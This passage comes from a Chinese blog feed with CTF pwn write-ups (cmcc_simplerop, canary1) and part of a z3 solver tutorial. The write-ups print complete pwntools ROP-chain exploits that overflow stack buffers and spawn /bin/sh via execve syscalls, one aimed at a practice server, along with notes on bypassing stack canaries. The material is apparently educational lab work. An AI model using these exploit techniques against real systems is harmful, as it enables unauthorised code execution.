记得要加上pack这个模块的引用,因为shellcode要用到</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27861</span>)</span><br><span class="line"><span class="comment"># 定义一个函数,将生成的shellcode直接粘贴进去,加上b&#x27;a&#x27; * (0xc + 4)的偏移即可</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shellcode</span>():</span><br><span class="line">    p = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0xc</span> + <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>)  <span class="comment"># pop edx ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea060</span>)  <span class="comment"># @ .data</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b8016</span>)  <span class="comment"># pop eax ; ret</span></span><br><span class="line">    p += <span class="string">b&#x27;/bin&#x27;</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805466b</span>)  <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>)  <span class="comment"># pop edx ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea064</span>)  <span class="comment"># @ .data + 4</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b8016</span>)  <span class="comment"># pop eax ; ret</span></span><br><span class="line">    p += <span class="string">b&#x27;//sh&#x27;</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805466b</span>)  <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>)  <span class="comment"># pop edx ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>)  <span class="comment"># @ .data + 8</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080492d3</span>)  <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805466b</span>)  <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080481c9</span>)  <span class="comment"># pop ebx ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea060</span>)  <span class="comment"># @ .data</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080de769</span>)  <span class="comment"># pop ecx ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>)  <span class="comment"># @ .data + 8</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>)  <span class="comment"># pop edx ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>)  <span class="comment"># @ .data + 8</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080492d3</span>)  <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806c943</span>)  <span class="comment"># int 0x80</span></span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = shellcode()</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行没有问题:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230812234652868.png" alt="image-20230812234652868"></p><p>然后我想自己构造(具体知识见百度[ctf rop]…):</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pop_eax_ret_addr = <span class="number">0x080b8016</span></span><br><span class="line">pop_edx_ecx_ebx_ret_addr = <span class="number">0x0806ed00</span></span><br><span class="line">sh_addr = <span class="number">0x080be47d</span></span><br><span class="line">int_0x80_addr = <span class="number">0x0806c943</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0xc</span>+<span class="number">4</span>) + p32(pop_eax_ret_addr) + p32(<span class="number">0xb</span>)</span><br><span class="line">payload += p32(pop_edx_ecx_ebx_ret_addr) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) +p32(sh_addr)+p32(int_0x80_addr)</span><br></pre></td></tr></table></figure><p>但是sh_addr不行,因为sys_execve()要使用’&#x2F;bin&#x2F;bash’,所以这里应该手动注入:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230812235420260.png" alt="image-20230812235420260" style="zoom:50%;" /><p>截图取自<a href="https://blog.csdn.net/qq_73149934/article/details/128430238">https://blog.csdn.net/qq_73149934/article/details/128430238</a></p><p>这里先放个记录,回头再看看</p><h2 id="cmcc-simplerop"><a href="#cmcc-simplerop" class="headerlink" title="cmcc_simplerop"></a>cmcc_simplerop</h2><p>这个题也是rop,不过用ROPgadget生成的shellcode跑不通,手动写的syscall可以过</p><p>checksec发现没有PIE,开了NX</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230813120940170.png" alt="image-20230813120940170" style="zoom:45%;" /><p>题目很简单,就是直接让read溢出,这里的思路是用系统调用11来用execve进行getshell</p><p>先计算个偏移(IDA里直接看的有误):</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230813125157314.png" alt="image-20230813125157314"></p><p>生成一串数字复制下来然后调试:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230813125237078.png" alt="image-20230813125237078"></p><p>输入那串字符:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230813125253822.png" alt="image-20230813125253822"></p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230813125318034.png" alt="image-20230813125318034"></p><p>这里提示了一个无效地址,然后再运行这个命令:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230813125359575.png" alt="image-20230813125359575"></p><p>找到偏移32(即0x20)</p><p>接下来分析rop,用ROPgadget发现没有’&#x2F;bin&#x2F;sh\x00’这个字符串,所幸有read函数,那么首先要用栈溢出将返回地址返回到read函数来将其注入到.bss段(这道题没有开启PIE，bss的地址就是绝对地址)</p><p>如此有第一段payload如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ret to read() --- read &#x27;/bin/sh&#x27;</span></span><br><span class="line">read_addr = <span class="number">0x0806CD50</span></span><br><span class="line"><span class="comment"># bin_sh_addr 为从.bss段中找的足够长的一段内存</span></span><br><span class="line">bin_sh_addr = <span class="number">0x080EAFBF</span></span><br><span class="line"><span class="comment">#最后的0x8为接下来要输入的&#x27;/bin/sh\x00&#x27;字符串的长度</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x20</span>) + p32(read_addr) + p32(pop_edx_ecx_ebx_ret_addr) + p32(<span class="number">0</span>) + p32(bin_sh_addr) + p32(<span class="number">0x8</span>)</span><br></pre></td></tr></table></figure><p>再接下来就是系统调用,知识见inndy_rop的WP:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># syscall --- execve</span></span><br><span class="line">payload += p32(pop_eax_ret_addr) + p32(<span class="number">0xb</span>)</span><br><span class="line">payload += p32(pop_edx_ecx_ebx_ret_addr) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(bin_sh_addr) + p32(int_0x80_addr)</span><br></pre></td></tr></table></figure><p>最后记得要多加一个字符串的输入:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br></pre></td></tr></table></figure><p>最后总的代码如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26428</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./rop&#x27;)</span></span><br><span class="line"></span><br><span class="line">pop_eax_ret_addr = <span class="number">0x080bae06</span></span><br><span class="line">pop_edx_ecx_ebx_ret_addr = <span class="number">0x0806e850</span></span><br><span class="line">sh_addr = <span class="number">0x080c1a9d</span></span><br><span class="line">int_0x80_addr = <span class="number">0x080493e1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ret to read() --- read &#x27;/bin/sh&#x27;</span></span><br><span class="line">read_addr = <span class="number">0x0806CD50</span></span><br><span class="line"><span class="comment"># bin_sh_addr 为从.bss段中找的足够长的一段内存</span></span><br><span class="line">bin_sh_addr = <span class="number">0x080EAFBF</span></span><br><span class="line"><span class="comment"># 最后的0x8为接下来要输入的&#x27;/bin/sh\x00&#x27;字符串的长度</span></span><br><span class="line"><span class="comment"># 0x20的偏移需要使用调试去动态检查出来(cyclic -l 0x61616169)</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x20</span>) + p32(read_addr) + p32(pop_edx_ecx_ebx_ret_addr) + p32(<span class="number">0</span>) + p32(bin_sh_addr) + p32(<span class="number">0x8</span>)</span><br><span class="line"><span class="comment"># syscall --- execve</span></span><br><span class="line">payload += p32(pop_eax_ret_addr) + p32(<span class="number">0xb</span>)</span><br><span class="line">payload += p32(pop_edx_ecx_ebx_ret_addr) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(bin_sh_addr) + p32(int_0x80_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下面的是失败的ropchain(ROPgadget生成的)</span></span><br><span class="line"><span class="comment"># def shellcode():</span></span><br><span class="line"><span class="comment">#     p = b&#x27;a&#x27; * 0x20</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x0806e82a)  # pop edx ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x080ea060)  # @ .data</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x080bae06)  # pop eax ; ret</span></span><br><span class="line"><span class="comment">#     p += b&#x27;/bin&#x27;</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x0809a15d)  # mov dword ptr [edx], eax ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x0806e82a)  # pop edx ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x080ea064)  # @ .data + 4</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x080bae06)  # pop eax ; ret</span></span><br><span class="line"><span class="comment">#     p += b&#x27;//sh&#x27;</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x0809a15d)  # mov dword ptr [edx], eax ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x0806e82a)  # pop edx ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x080ea068)  # @ .data + 8</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x08054250)  # xor eax, eax ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x0809a15d)  # mov dword ptr [edx], eax ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x080481c9)  # pop ebx ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x080ea060)  # @ .data</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x0806e851)  # pop ecx ; pop ebx ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x080ea068)  # @ .data + 8</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x080ea060)  # padding without overwrite ebx</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x0806e82a)  # pop edx ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x080ea068)  # @ .data + 8</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x08054250)  # xor eax, eax ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x0807b27f)  # inc eax ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x0807b27f)  # inc eax ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x0807b27f)  # inc eax ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x0807b27f)  # inc eax ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x0807b27f)  # inc eax ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x0807b27f)  # inc eax ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x0807b27f)  # inc eax ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x0807b27f)  # inc eax ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x0807b27f)  # inc eax ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x0807b27f)  # inc eax ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x0807b27f)  # inc eax ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x080493e1)  # int 0x80</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#     return p</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = shellcode()</span></span><br></pre></td></tr></table></figure><p>运行结果:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230813121936742.png" alt="image-20230813121936742" style="zoom:45%;" /><p>结束…</p><h2 id="canary1"><a href="#canary1" class="headerlink" title="canary1"></a>canary1</h2><p>关于canary…百度复习吧…</p><p>绕过方法:</p><p>​1.大量fork的题: 使用逐字节爆破的方法</p><p>​2.字符串输出泄露canary</p><p>​3.GOT表劫持</p><p>但是…这道题是假的canary!!!</p><p>虽然checksec显示有canary…但是…</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230813223357926.png" alt="image-20230813223357926" style="zoom:50%;" /><p>看汇编也能看出来,xor的结果根本就没有用到,下面是无条件跳转到call之后:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230813223656235.png" alt="image-20230813223656235" style="zoom:50%;" /><p>而且实际编写脚本也能发现0x20的输入长度根本不足以溢出到覆盖所谓canary的开头的00字节:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230813223739191.png" alt="image-20230813223739191" style="zoom:50%;" /><p>所以实际上就是个常规溢出,这里是syscall的getshell方式,而且题目中已经存在’&#x2F;bin&#x2F;sh’了…</p><p>本来这个题原本是用字符串溢出来泄露canary的…但是被某大佬patch掉了…orz</p><p>代码如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = remote(&#x27;node4.buuoj.cn&#x27;, 26428)</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./canary1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># syscall</span></span><br><span class="line">string = <span class="string">&#x27;what do you want to say:\n&#x27;</span></span><br><span class="line">paddings = <span class="number">0x28</span></span><br><span class="line">bin_sh_addr = <span class="number">0x000000006b90f0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#这里注意64位传参的前三个参数依次为rdi,rsi,rdx</span></span><br><span class="line">pop_rax_ret_addr = <span class="number">0x00000000004005af</span></span><br><span class="line">pop_rdi_ret_addr = <span class="number">0x00000000004006a6</span></span><br><span class="line">pop_rsi_ret_addr = <span class="number">0x0000000000410183</span></span><br><span class="line">pop_rdx_ret_addr = <span class="number">0x000000000044b5c6</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 要使用syscall而不是x86的int_0x80</span></span><br><span class="line"><span class="comment"># 使用ROPgadget --binary canary1 --only syscall查找得到</span></span><br><span class="line"><span class="comment"># int_0x80_addr = 0x0000000000417f2f</span></span><br><span class="line">syscall_addr = <span class="number">0x00000000004012fc</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 注意此题为64位，系统调用和32位不同，所以不能使用11的方法，这里使用0x3b(59)</span></span><br><span class="line"><span class="comment"># 其他的基本一致</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * paddings + p64(pop_rax_ret_addr) + p64(<span class="number">0x3b</span>)</span><br><span class="line">payload += p64(pop_rdi_ret_addr) + p64(bin_sh_addr) + p64(pop_rsi_ret_addr) + p64(<span class="number">0</span>) + p64(pop_rdx_ret_addr) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(syscall_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;How to bypass canary:  \n&quot;</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">p.sendlineafter(string, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>运行结果:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230813223307551.png" alt="image-20230813223307551"></p><p>结束…</p>]]></content>
      
      
      <categories>
          
          <category> 二进制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RE </tag>
            
            <tag> PWN </tag>
            
            <tag> NX </tag>
            
            <tag> mprotect </tag>
            
            <tag> rop </tag>
            
            <tag> syscall </tag>
            
            <tag> canary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python常用工具库</title>
      <link href="/2023/08/03/%E5%85%B6%E4%BB%96/Python%E5%B8%B8%E7%94%A8%E5%BA%93/"/>
      <url>/2023/08/03/%E5%85%B6%E4%BB%96/Python%E5%B8%B8%E7%94%A8%E5%BA%93/</url>
      
        <content type="html"><![CDATA[<h1 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h1><h2 id="IDA-Python"><a href="#IDA-Python" class="headerlink" title="IDA Python"></a>IDA Python</h2><p>顾名思义,在IDA中写python脚本,用来提取数据等</p><p>用到idc_bc695这个库</p><p>另见:</p><p>​<a href="https://blog.csdn.net/m0_52164435/article/details/124878537">https://blog.csdn.net/m0_52164435/article/details/124878537</a></p><h1 id="外部工具"><a href="#外部工具" class="headerlink" title="外部工具"></a>外部工具</h1><h2 id="数学库"><a href="#数学库" class="headerlink" title="数学库"></a>数学库</h2><h3 id="z3库"><a href="#z3库" class="headerlink" title="z3库"></a>z3库</h3><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p>需要使用python3(python2已不再受支持,安装很可能出现问题)来安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pip install z3</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">上面命令失败的话可以尝试</span></span><br><span class="line">pip install z3-solver</span><br></pre></td></tr></table></figure><h4 id="声明求解范围"><a href="#声明求解范围" class="headerlink" title="声明求解范围"></a>声明求解范围</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Int()和Ints()函数用于申请整数解</span></span><br><span class="line">a = Int(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">a,b = Ints(<span class="string">&#x27;a b&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 有理数解</span></span><br><span class="line">a = Real(<span class="string">&quot;a&quot;</span>)</span><br><span class="line">a, b = Reals(<span class="string">&quot;a b&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 位向量，用于求解与/或/移位等位运算</span></span><br><span class="line"><span class="comment"># 第二个参数表示位数</span></span><br><span class="line">a = BitVec(<span class="string">&quot;a&quot;</span>, <span class="number">8</span>)</span><br><span class="line">a, b = BitVecs(<span class="string">&quot;a b&quot;</span>, <span class="number">8</span>)</span><br></pre></td></tr></table></figure><h4 id="增加方程约束"><a href="#增加方程约束" class="headerlink" title="增加方程约束"></a>增加方程约束</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#建立求解器</span></span><br><span class="line">S=Solver()</span><br><span class="line"><span class="comment">#添加约束</span></span><br><span class="line">equs=[</span><br><span class="line">    a+b==<span class="number">10</span>,</span><br><span class="line">    a-b==<span class="number">6</span></span><br><span class="line">]</span><br><span class="line">S.add(equs)</span><br><span class="line"><span class="comment">#也可以一个一个加</span></span><br><span class="line">S.add(a+b==<span class="number">10</span>)</span><br></pre></td></tr></table></figure><h4 id="求解"><a href="#求解" class="headerlink" title="求解"></a>求解</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(s.check())   <span class="comment"># sat代表有解，unsat代表无解</span></span><br><span class="line"><span class="built_in">print</span>(s.model())</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 工具库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RE </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>8086汇编学习笔记1---寄存器</title>
      <link href="/2023/07/31/%E4%BA%8C%E8%BF%9B%E5%88%B6/8086%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/"/>
      <url>/2023/07/31/%E4%BA%8C%E8%BF%9B%E5%88%B6/8086%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/</url>
      
